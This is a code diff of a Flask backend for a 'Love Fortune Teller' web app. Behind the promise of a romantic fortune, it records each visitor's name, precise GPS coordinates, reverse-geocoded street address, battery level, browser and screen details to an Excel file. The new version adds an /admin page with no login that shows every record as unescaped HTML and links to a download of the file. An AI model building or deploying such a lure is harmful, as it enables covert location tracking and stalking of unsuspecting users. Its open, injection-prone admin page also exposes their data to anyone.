@@ -1,86 +1,75 @@
-# app.py
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 import pandas as pd
 import requests
 import os
 from datetime import datetime
-import random
 
 app = Flask(__name__)
-CORS(app)  # Allow any frontend to call this API
+CORS(app)
 
-os.makedirs('excel_files', exist_ok=True)
+EXCEL_FILE = 'fortunes_data.xlsx'
 
-def get_address(lat, lon):
+def init_excel():
+    if not os.path.exists(EXCEL_FILE):
+        df = pd.DataFrame(columns=['timestamp', 'name', 'latitude', 'longitude', 'accuracy', 'address', 'battery', 'userAgent', 'screen'])
+        df.to_excel(EXCEL_FILE, index=False)
+
+def geocode_reverse(lat, lon):
     try:
-        url = "https://nominatim.openstreetmap.org/reverse"
-        params = {'lat': lat, 'lon': lon, 'format': 'json', 'addressdetails': 1}
-        headers = {'User-Agent': 'Fortune-App/1.0'}
-        r = requests.get(url, params=params, headers=headers, timeout=8)
-        return r.json().get('display_name', 'Address found')
+        url = f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json"
+        resp = requests.get(url, headers={'User-Agent': 'LoveFortuneTeller/1.0'})
+        data = resp.json()
+        return data.get('display_name', 'Unknown')
     except:
-        return 'Location captured'
-
-@app.route('/save', methods=['POST'])
-def save():
-    try:
-        data = request.json
-        name = data['name']
-        lat = data['lat']
-        lon = data['lon']
-        addr = get_address(lat, lon)
-        maps_link = f"https://www.google.com/maps?q={lat},{lon}"
-        battery = data.get('battery')
-        batt_level = battery['level'] if battery else 'N/A'
-        batt_charging = battery['charging'] if battery else 'N/A'
-
-        record = {
-            'DateTime': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-            'Name': name,
-            'Latitude': lat,
-            'Longitude': lon,
-            'Google Maps': maps_link,
-            'Accuracy_m': data['accuracy'],
-            'Address': addr,
-            'Battery_%': batt_level,
-            'Charging': batt_charging,
-            'Device': data.get('ua', '')[:100],
-            'Screen': data.get('screen', ''),
-            'Platform': data.get('platform', '')
-        }
-
-        excel_path = os.path.join('excel_files', 'fortunes_data.xlsx')
-        if os.path.exists(excel_path):
-            old = pd.read_excel(excel_path)
-            df = pd.concat([old, pd.DataFrame([record])], ignore_index=True)
-        else:
-            df = pd.DataFrame([record])
-        df.to_excel(excel_path, index=False, engine='openpyxl')
-
-        messages = [
-            f"💕 Dear {name}, someone special is thinking of you right now! 💕",
-            f"💖 {name}, a beautiful soul is about to enter your life! 💖",
-            f"💗 {name}, the universe has heard your heart's desire! 💗",
-            f"💓 {name}, your future soulmate is closer than you think! 💓",
-            f"💝 {name}, someone you meet today will change your life! 💝",
-            f"💕 {name}, love is coming your way sooner than you expect! 💕",
-            f"💖 {name}, your positive energy is attracting true love! 💖",
-            f"💗 {name}, the stars are aligning just for you today! 💗",
-            f"💓 {name}, a wonderful surprise awaits your heart! 💓",
-            f"💝 {name}, someone is secretly falling for you! 💝"
-        ]
-        fortune = random.choice(messages)
-
-        print(f"✅ {name} | {lat:.4f}, {lon:.4f} | Battery: {batt_level}%")
-        return jsonify({'success': True, 'fortune': fortune})
-    except Exception as e:
-        print("ERROR:", e)
-        return jsonify({'success': False, 'error': str(e)}), 500
+        return 'Address unavailable'
 
 @app.route('/')
 def home():
-    return "Backend is running! Use POST to /save"
+    return "Love Fortune Teller Backend 💕"
+
+@app.route('/save', methods=['POST'])
+def save_data():
+    init_excel()
+    data = request.json
+    
+    address = geocode_reverse(data['latitude'], data['longitude'])
+    
+    new_row = {
+        'timestamp': datetime.now().isoformat(),
+        'name': data['name'],
+        'latitude': data['latitude'],
+        'longitude': data['longitude'],
+        'accuracy': data['accuracy'],
+        'address': address,
+        'battery': data['battery'],
+        'userAgent': data['userAgent'],
+        'screen': data['screen']
+    }
+    
+    df = pd.read_excel(EXCEL_FILE)
+    df = pd.concat([df, pd.DataFrame([new_row])], ignore_index=True)
+    df.to_excel(EXCEL_FILE, index=False)
+    
+    return jsonify({'status': 'saved', 'love': 'captured 💖'})
+
+@app.route('/admin')
+def admin():
+    if not os.path.exists(EXCEL_FILE):
+        return "No data yet 💕"
+    
+    df = pd.read_excel(EXCEL_FILE)
+    html = "<h1>Love Data Admin 💋</h1><table border='1'>"
+    for col in df.columns:
+        html += f"<th>{col}</th>"
+    for _, row in df.iterrows():
+        html += "<tr>"
+        for val in row:
+            html += f"<td>{val}</td>"
+        html += "</tr>"
+    html += "</table><br><a href='/fortunes_data.xlsx'>Download Excel</a>"
+    return html
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+    init_excel()
+    app.run(host='0.0.0.0', port=5000)
